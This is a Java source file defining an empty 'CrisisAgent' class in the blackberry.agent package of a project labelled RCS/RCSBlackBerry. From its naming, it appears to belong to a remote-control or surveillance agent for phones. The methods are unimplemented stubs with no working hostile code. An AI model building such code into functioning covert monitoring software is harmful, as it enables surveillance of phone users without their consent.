//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : CrisisAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class CrisisAgent.
 */
public final class CrisisAgent extends Agent {
    //#ifdef DEBUG
    static Debug debug = new Debug("CrisisAgent", DebugLevel.VERBOSE);

    //#endif

    /**
     * Instantiates a new crisis agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public CrisisAgent(final boolean agentStatus) {
        super(Agent.AGENT_CRISIS, agentStatus, true, "CrisisAgent");
    }

    /**
     * Instantiates a new crisis agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected CrisisAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {

    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
